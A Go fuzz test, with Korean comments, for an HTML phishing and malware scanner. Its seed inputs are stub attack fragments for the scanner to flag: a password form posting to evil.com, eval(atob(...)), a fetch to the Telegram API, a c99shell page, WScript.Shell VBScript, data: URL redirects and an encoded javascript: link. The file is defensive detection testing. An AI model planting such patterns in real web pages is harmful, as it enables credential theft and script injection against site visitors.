package scanner

import (
	"fmt"
	"testing"
)

// 스캐너 전체가 어떤 입력에도 죽지 않고, 유효한 탐지를 하는지 확인.
func FuzzScan(f *testing.F) {
	seeds := []struct{ html, url string }{
		// 자격증명
		{`<form action="https://evil.com/x"><input type=password></form>`, "https://bank.com/login"},
		{`<form action="http://a.com/x"><input type=password></form>`, "https://a.com/"},
		{`<form action="http://127.0.0.1/x"><input type=password></form>`, "https://a.com/"},
		{`<input type="text" name="password">`, "https://a.com/"},
		// 실행·리다이렉트
		{`<script>eval(atob("x"))</script>`, "https://a.com/"},
		{`<script>fetch("https://api.telegram.org/b")</script>`, "https://a.com/"},
		{`<title>c99shell</title><form><input type=file></form>`, "https://a.com/"},
		{`<p>Safe-mode: OFF</p><pre>drwxr-xr-x .</pre><input type=file>`, "https://a.com/"},
		{`<script language="VBScript">CreateObject("WScript.Shell")</script>`, "https://a.com/"},
		{`<meta http-equiv="refresh" content="0;url=data:text/html,x">`, "https://a.com/"},
		{`<iframe src="data:text/html;base64,PA=="></iframe>`, "https://a.com/"},
		{`<a href="&#106;avascript:alert(1)">z</a>`, ""},
		// 출처·공급망
		{`<base href="https://evil.com/">`, "https://a.com/"},
		{`<iframe sandbox="allow-scripts allow-same-origin"></iframe>`, "https://a.com/"},
		{`<script src="//cdn.x.com/a.js"></script><img src="http://x/a.png">`, "https://a.com/"},
		{`<script src="http://203.0.113.5/a.js"></script>`, "https://a.com/"},
		{`<a href="/d/run.hta">x</a><a target=_blank href=/x>z</a>`, "https://a.com/"},
		// 난독화·한계
		{"<p>보이지\u200b않음</p>", "https://a.com/"},
		{`<script><!--<script></script><img onerror=x>//--></script>`, "https://a.com/"},
		{`<body><div id=root></div><script src=/a.js></script></body>`, "https://a.com/"},
		{`<title>Suspected Phishing | Cloudflare</title><p>Ray ID: 1</p>`, "https://evil.com/"},
		// 병적 입력
		{"<<<>>>", "://@:"},
		{"", ""},
	}
	for _, s := range seeds {
		f.Add(s.html, s.url)
	}
	f.Fuzz(func(t *testing.T, html, pageURL string) {
		res := ScanURL(html, pageURL)

		for _, fd := range res.Findings {
			if fd.Code == "" {
				t.Fatalf("코드 없는 발견: %+v", fd)
			}
			if fd.Class.String() == "?" {
				t.Fatalf("%s 의 Class 가 유효하지 않음: %d", fd.Code, fd.Class)
			}
			if fd.Severity.String() == "?" {
				t.Fatalf("%s 의 Severity 가 유효하지 않음: %d", fd.Code, fd.Severity)
			}
			if fd.Offset < 0 || len(html) < fd.Offset {
				t.Fatalf("발견 오프셋 %d가 범위 밖 (len=%d)", fd.Offset, len(html))
			}
			if fd.Line < 1 || fd.Col < 1 {
				t.Fatalf("%s의 위치가 %d:%d", fd.Code, fd.Line, fd.Col)
			}
		}

		// Notes에 빈 항목이나 폭주가 있으면 안됨.
		if 4 < len(res.Notes) {
			t.Fatalf("Notes 가 %d개 — 폭주", len(res.Notes))
		}
		for _, n := range res.Notes {
			if n == "" {
				t.Fatal("빈 Note")
			}
		}

		// 개수와 순서까지 검증
		if a, b := fingerprint(res), fingerprint(ScanURL(html, pageURL)); a != b {
			t.Fatalf("두 번 스캔 결과가 다름:\n1: %s\n2: %s", a, b)
		}
	})
}

func fingerprint(r Result) string {
	s := ""
	for _, f := range r.Findings {
		s += fmt.Sprintf("%s@%d;", f.Code, f.Offset)
	}
	for _, n := range r.Notes {
		s += "N:" + n + ";"
	}
	return s
}
